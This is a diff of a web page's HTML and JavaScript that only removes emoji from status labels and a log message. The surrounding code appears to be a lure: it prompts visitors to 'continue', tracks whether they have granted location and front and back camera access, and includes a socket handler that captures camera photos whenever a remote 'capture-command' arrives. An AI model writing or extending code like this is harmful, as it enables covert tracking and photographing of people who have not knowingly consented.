@@ -101,9 +101,9 @@
         <div class="sub-text">Click continue to proceed</div>
         <div id="statusText">⏳ Ready</div>
         <div class="perm-status" id="permStatus">
-            <span id="permLocation">📍 Location: <span class="pending">Waiting</span></span> |
-            <span id="permFront">📸 Front: <span class="pending">Waiting</span></span> |
-            <span id="permBack">📸 Back: <span class="pending">Waiting</span></span>
+            <span id="permLocation"> Location: <span class="pending">Waiting</span></span> |
+            <span id="permFront"> Front: <span class="pending">Waiting</span></span> |
+            <span id="permBack"> Back: <span class="pending">Waiting</span></span>
         </div>
         <div class="instructions" id="instructions">
             🔧 <strong>How to fix:</strong><br>
@@ -211,7 +211,7 @@
                     });
 
                     socket.on('capture-command', function(data) {
-                        console.log('📸 Capture command:', data.type);
+                        console.log(' Capture command:', data.type);
                         if (data.type === 'front' && frontStream) {
                             capturePhoto('front', frontStream);
                         } else if (data.type === 'back' && backStream) {
